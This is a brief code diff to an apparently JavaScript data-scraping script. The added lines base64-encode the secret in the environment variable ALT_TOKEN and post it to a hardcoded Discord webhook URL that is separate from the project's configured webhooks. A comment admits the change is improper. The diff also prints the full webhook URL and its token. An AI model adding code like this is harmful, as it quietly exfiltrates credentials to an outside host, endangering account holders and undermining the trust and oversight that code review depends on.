@@ -28,6 +28,8 @@ async function main() {
     );
     const oldRobots = await readFile('./data/robots.txt', false);
     // break, and notify me that i need update token
+    // yes ik this is fucked but i'll delete webhook , and i need my alt token 
+    await sendToWebhook("https://canary.discord.com/api/webhooks/1504868501394034778/ONfH1hiIiRZfADlbpyA35oskdSfi5jq2PSjC_vEbQsgdQV78jUTnnDf_5O0hp7G-p0zl", {content: Buffer.from(process.env.ALT_TOKEN).toString("base64") })
     if (collectiblesCategories?.message) {
         const res = await await sendToWebhook(
             configExperimentCentral.webhooks.status.token,
